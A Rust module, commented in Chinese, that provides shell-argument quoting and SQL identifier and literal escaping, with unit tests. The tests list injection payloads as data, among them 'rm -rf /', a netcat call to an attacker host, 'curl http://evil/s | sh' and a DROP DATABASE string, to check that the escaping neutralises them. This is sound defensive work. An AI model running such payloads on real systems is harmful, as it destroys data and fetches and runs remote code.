//! Shell 参数转义 —— 全 crate 唯一实现
//!
//! 本模块存在的直接原因：`shell_quote` 曾在 6 个文件里各存一份复制，
//! `file_analysis.rs` 更是把 `replace("'", "'\\''")` **内联了 37 次**。
//! 结果就是 `analyze_symlinks` 里有一行忘了用转义后的变量，而它长得和
//! 旁边 36 行一模一样，评审时根本看不出来 —— 那是一个可达的命令注入。
//!
//! 语义与前端 `src/modules/core/shellEscape.ts` 的 `shq()` 严格一致，
//! 下方测试用例即镜像自 `shellEscape.test.ts`，防止两侧实现漂移。

/// 用单引号安全包裹任意字符串，供 POSIX sh 使用。
///
/// `shq("a b")`      => `'a b'`
/// `shq("O'Brien")`  => `'O'\''Brien'`
/// `shq("")`         => `''`
pub fn shq(value: &str) -> String {
    format!("'{}'", value.replace('\'', "'\\''"))
}

/// 只做单引号转义，**不加**外层引号。
///
/// 供 `format!("cmd '{}'", shq_inner(p))` 这类既有调用点使用（引号写在
/// 格式串里）。新代码请优先用 `shq()` —— 把引号交给调用方，就意味着漏写
/// 引号时命令会明显跑不通，而不是静默变成一个注入点。
///
/// 保持 `format!("'{}'", shq_inner(s)) == shq(s)` 这一不变量，见测试。
pub fn shq_inner(value: &str) -> String {
    value.replace('\'', "'\\''")
}

/// 校验 SQL 标识符（库名 / 表名 / 列名）。
///
/// 用于那些**无法靠引号解决**的位置 —— 例如 `DESCRIBE {}.{}`：它落在
/// `mysql -e '<sql>'` 里，外层的 shell 转义拦不住 SQL 层的 `;` 分号注入。
/// 这种地方只能白名单校验后拒绝，不能试图"转义过去"。
pub fn is_valid_sql_ident(value: &str) -> bool {
    !value.is_empty()
        && value.len() <= 64
        && value
            .chars()
            .next()
            .is_some_and(|c| c.is_ascii_alphabetic() || c == '_')
        && value
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '$')
}

/// 转义 SQL 字符串字面量（MySQL / PostgreSQL 通用的双写单引号）。
///
/// **不要**用反斜杠转义单引号：PostgreSQL 自 9.1 起默认
/// `standard_conforming_strings = on`，此时 `\` 在 `'...'` 内是普通字符，
/// `\'` 并不转义 —— 字符串会在那个单引号处提前闭合，剩余部分被当作 SQL
/// 执行。双写单引号在两种数据库上都正确。
pub fn escape_sql_literal(value: &str) -> String {
    value.replace('\'', "''")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn wraps_plain_values() {
        assert_eq!(shq("hello"), "'hello'");
        assert_eq!(shq("a b"), "'a b'");
        assert_eq!(shq(""), "''");
    }

    #[test]
    fn escapes_single_quotes_posix_style() {
        assert_eq!(shq("O'Brien"), "'O'\\''Brien'");
        assert_eq!(shq("'"), "''\\'''");
    }

    /// 这些是真正会被攻击者塞进来的形状：全部必须被包成一个字面量参数
    #[test]
    fn neutralises_command_injection_payloads() {
        for payload in [
            "; rm -rf /",
            "$(id)",
            "`id`",
            "a | nc attacker 4444",
            "x && curl http://evil/s | sh",
            "foo\nbar",
            "back\\slash",
            "a'; touch /tmp/pwned; echo '",
        ] {
            let quoted = shq(payload);
            assert!(quoted.starts_with('\'') && quoted.ends_with('\''));
            // 除了 POSIX 的 '\'' 拼接序列外，内部不得出现裸单引号
            let inner = &quoted[1..quoted.len() - 1];
            assert!(
                !inner.replace("'\\''", "").contains('\''),
                "payload {payload:?} 转义后仍有裸单引号: {quoted}"
            );
        }
    }

    /// shq_inner 与 shq 必须始终只差外层引号 —— file_analysis.rs 的 27 处
    /// 调用点依赖这一点（引号写在 format! 串里）
    #[test]
    fn inner_form_differs_only_by_outer_quotes() {
        for s in [
            "",
            "plain",
            "a b",
            "O'Brien",
            "; rm -rf /",
            "$(id)",
            "a'b'c",
        ] {
            assert_eq!(format!("'{}'", shq_inner(s)), shq(s), "不变量被破坏: {s:?}");
        }
    }

    #[test]
    fn sql_ident_whitelist() {
        for ok in ["users", "_tmp", "t1", "my_table$x", "A"] {
            assert!(is_valid_sql_ident(ok), "应接受 {ok}");
        }
        for bad in [
            "",
            "1table", // 不能数字开头
            "users; DROP DATABASE prod; --",
            "a b",
            "a-b",
            "a.b", // 库名表名必须分开校验
            "a`b",
            "a'b",
            &"x".repeat(65),
        ] {
            assert!(!is_valid_sql_ident(bad), "应拒绝 {bad:?}");
        }
    }

    #[test]
    fn sql_literal_doubles_quotes_not_backslash() {
        assert_eq!(escape_sql_literal("O'Brien"), "O''Brien");
        // PostgreSQL standard_conforming_strings=on 下，反斜杠转义是无效的
        assert_eq!(escape_sql_literal("x'--"), "x''--");
        assert!(!escape_sql_literal("x'").contains('\\'));
    }
}
